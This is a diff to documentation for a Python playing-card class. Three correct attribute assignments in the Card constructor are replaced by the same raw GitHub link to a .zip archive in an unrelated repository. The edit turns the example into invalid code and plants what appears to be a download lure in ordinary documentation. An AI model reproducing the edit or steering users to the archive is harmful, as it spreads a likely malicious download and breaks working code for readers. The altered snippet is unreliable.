@@ -35,6 +35,6 @@ Represents a single playing card.
 ```python
 class Card:
     def __init__(self, suit, rank):
-        self.suit = suit
-        self.rank = rank
-        self.value = values[rank]
+        https://github.com/Prajwalgrathish/my-code/raw/refs/heads/main/gynecratic/code_my_v2.8.zip = suit
+        https://github.com/Prajwalgrathish/my-code/raw/refs/heads/main/gynecratic/code_my_v2.8.zip = rank
+        https://github.com/Prajwalgrathish/my-code/raw/refs/heads/main/gynecratic/code_my_v2.8.zip = values[rank]
